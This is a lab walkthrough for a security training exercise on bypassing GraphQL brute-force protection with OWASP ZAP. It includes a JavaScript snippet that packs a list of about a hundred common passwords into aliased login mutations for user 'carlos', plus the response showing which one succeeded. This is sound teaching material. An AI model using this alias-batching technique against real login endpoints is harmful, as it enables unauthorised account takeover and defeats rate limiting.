# Lab: Bypassing GraphQL brute force protections

In ZAP's browser attempt a login with credentials `admin:admin`. In __History__ tab, notice a `POST /graphql/v1` request and right-click it to "Open in Requester Tab". 

The request body, should look something like this:

```json
{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"admin","password":"admin"}}}
```

This is what is known as an __escaped__ GraphQL query (with all the `\n` characters and whitespaces). Unfortunately ZAP doesn't have a neat __GraphQL__ tab in Requester, the way Burp does in Repeater, so we will have to tweak the JavaScript provided by the lab under the _Tip_ section, so that it generates a list of escaped GraphQL query aliases:

```javascript
copy("123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow".split(',').map((p,i)=>`\\n        bruteforce${i}: login(input:{username:\\"carlos\\", password:\\"${p}\\"}) { token success }`).join('')); console.log('Escaped GraphQL aliases copied!');
```

Now the output of this will automatically copied to your clipboard. Go back to __Requester Tab__ and request body and paste it right after the `success\n        }\n` (put your cursor after the second `\n` in the example and paste). Click "Send". Here's part of the response we care about:

```json
"bruteforce91": { 
      "token": "V5NWAbENoRZPFmp7yOwHSiTozrt33eKt",
      "success": true
},
```

> The rest of the flow is the same as in the [original](README.md) write-up.
